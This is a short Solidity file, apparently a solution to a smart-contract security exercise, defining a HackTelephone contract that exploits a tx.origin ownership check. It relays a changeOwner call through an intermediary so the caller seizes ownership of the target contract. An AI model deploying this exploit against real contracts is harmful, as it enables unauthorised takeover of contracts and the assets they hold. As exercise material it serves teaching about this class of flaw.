// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @dev The protection using tx.origin can be easily destroyed with call mesage from
/// other smart contracts -> the origin is me but msg.sender become my intermediate contract...
contract HackTelephone {
    address telephoneToHack;

    constructor(address _telephoneToHack) {
        telephoneToHack = _telephoneToHack;
    }

    function setTelephoneAddress(address newAddress) external {
        telephoneToHack = newAddress;
    }

    function changeOwner() public {
        (bool success,) = telephoneToHack.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
        require(success);
    }
}